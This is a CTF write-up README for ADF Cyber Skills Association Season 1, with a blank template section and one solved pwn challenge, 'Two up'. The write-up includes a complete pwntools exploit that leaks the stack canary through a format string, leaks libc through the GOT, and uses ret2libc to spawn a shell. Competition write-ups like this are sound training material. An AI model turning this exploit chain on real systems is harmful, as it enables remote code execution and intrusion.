# CSA_S1_2024
# CTF Writeups
## Writeups for the ADF Cyber Skills Association Season 1 challenges.

### Title of challenge here
Description - xxxxxxxxxxxxxxxxxxxxxxxxxxx
```
place any code here
```
Solution:
Plugged this straight into ChatGPT:
```
More code here for solution
```
:+1: FLAG{ENTER_FLAG_HERE}
<hr>

### Two up
Description - Let's play some two-up! Flag format:
FLAG{0x.de-adbeef_cafe}

netcat to the remote server on port 1337 (from nmap scan)

Solution:
Found a great tutorial on youtube that went through canary's and NX.
(https://www.youtube.com/watch?v=XaWlKYgmEDs)
Referring to the code from CryptoCat, modified to produce the following.
In stages, running against the remote server, you can leak the libc address
which then allows you to narrow down the libc version running remotely using 
blukat (https://libc.blukat.me/)

After trying several libraries, it turned out to be libc6-amd64_2.31-13+deb11u7_i386.so
Downloaded that locally, renamed to libc.so.6 and ran the code again and got the shell

Overall there's 3 stages:
S1 - leak the Canary
S2 - leak libc
S3 - ret2libc for shell

Brickwalls:
It's tricky getting the code to send the payload at the right prompt of Bet: so that
has to be accurate in code for execution.
```
from pwn import *
import sys

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], int(sys.argv[2]), *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './twoup'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

def breakpoint_handler(signal, frame):
    print("Breakpoint reached")
    # You can add additional actions here if needed
    pass

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 15  # Canary offset

# Lib-C library
libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.27.so")

pop_rdi = 0x004013fb  # Found with ropper
ret = 0x00401016  # Found with ropper

# Send payload 1
log.info(f'Sending payload 1')
io.sendlineafter(b'Bet:', b'%9$p')
sleep(0.5)
# Canary value
reply1 = io.recvuntil(b'Your bet:')
print("Reply 1 is: ",reply1)
leaked_addresses = io.recvlineS().split("\n")[0]
print("Leaked addresses: ",leaked_addresses)
canary = int(leaked_addresses, 16)
log.info(f'Canary: {hex(canary)}')

# Build payload 2 (leak printf)
payload = flat([
    offset * b'A',  # Pad to canary (15)
    canary, # Our leaked canary (8)
    8 * b'A',  # Pad to Ret pointer (8)
    # Leak got.puts
    pop_rdi,
    elf.got.printf,
    elf.plt.printf,
    0x00401319
])
# Send payload 2
io.recvuntil(b'You lose')
io.sendlineafter(b'Bet:', payload)
sleep(0.5)
io.recvuntil(b'You lose')
io.recvline()
# Retrieve got.printf address
got_printf = unpack(io.recvline()[:6].ljust(8, b"\x00"))
info(f"leaked got_printf: {got_printf:#x}")
libc.address = got_printf - libc.symbols.printf
info(f"libc_base: {libc.address:#x}")

# Build payload 3 (ret2system)
payload = flat([
    offset * b'A',  # Pad to canary (15)
    canary, # Our leaked canary (8)
    8 * b'A',  # Pad to Ret pointer (8)
    # Ret2system
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    ret, # Stack alignment
    libc.symbols.system
])

# Send payload 3
io.recvline()
#io.recvuntil(b'You lose')
io.sendlineafter(b'Bet:',payload)

# Get our flag/shell
io.interactive()

```
:+1: FLAG{w3.w1ll-r3m3mb3r_th3m}
<hr>
